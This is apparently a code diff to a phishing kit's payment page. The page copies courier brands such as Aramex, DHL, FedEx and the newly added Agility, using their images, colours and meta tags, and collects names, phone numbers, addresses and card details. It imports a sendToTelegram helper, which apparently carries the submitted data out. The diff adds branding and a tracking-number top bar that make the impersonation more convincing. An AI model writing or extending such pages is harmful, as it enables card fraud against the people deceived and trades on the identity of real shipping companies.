@@ -14,6 +14,8 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import CompanyTopBar from "@/components/CompanyTopBar";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -36,6 +38,7 @@ import heroShipco from "@/assets/hero-shipco.jpg";
 import heroHellmann from "@/assets/hero-hellmann.jpg";
 import heroDsv from "@/assets/hero-dsv.jpg";
 import heroJinakum from "@/assets/hero-jinakum.jpg";
+import heroAgility from "@/assets/hero-agility.jpg";
 import heroBg from "@/assets/hero-bg.jpg";
 
 const PaymentRecipient = () => {
@@ -56,6 +59,7 @@ const PaymentRecipient = () => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
 
   // Use dynamic company meta for OG tags
@@ -125,6 +129,7 @@ const PaymentRecipient = () => {
     'hellmann': heroHellmann,
     'dsv': heroDsv,
     'jinakum': heroJinakum,
+    'agility': heroAgility,
   };
   
   const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
@@ -212,45 +217,33 @@ const PaymentRecipient = () => {
         <meta name="twitter:image" content={dynamicImage} />
       </Helmet>
       <div 
-        className="min-h-screen bg-background" 
+        className="min-h-screen" 
         dir="rtl"
+        style={{
+          background: `linear-gradient(to bottom, ${enhancedBranding?.colors.surface || '#FAFAFA'}, ${enhancedBranding?.colors.background || '#FFFFFF'})`
+        }}
       >
-        {/* Hero Section */}
-        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
-          <img 
-            src={heroImage}
-            alt={serviceName}
-            className="w-full h-full object-cover"
-          />
-          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
-          
-          {/* Logo Overlay */}
-          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
-            {branding.logo && (
-              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
-                <img 
-                  src={branding.logo} 
-                  alt={serviceName}
-                  className="h-12 sm:h-16 w-auto"
-                  onError={(e) => e.currentTarget.style.display = 'none'}
-                />
-              </div>
-            )}
-          </div>
-          
-          {/* Title Overlay */}
-          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
-            <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
-              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
-            </div>
-          </div>
-        </div>
+        {/* Company Top Bar */}
+        <CompanyTopBar
+          companyKey={serviceKey}
+          companyName={serviceName}
+          primaryColor={branding.colors.primary}
+          secondaryColor={branding.colors.secondary}
+          trackingNumber={shippingInfo?.tracking_number}
+        />
 
-        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+
+        <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
           <div className="max-w-2xl mx-auto">
             
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card 
+              className="p-4 sm:p-8 shadow-2xl" 
+              style={{ 
+                borderTop: `6px solid ${branding.colors.primary}`,
+                borderRadius: enhancedBranding?.borderRadius.lg || '12px',
+                boxShadow: enhancedBranding?.shadows.lg || '0 20px 25px -5px rgba(0, 0, 0, 0.1)'
+              }}
+            >
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
                   <h1 className="text-xl sm:text-3xl font-bold">
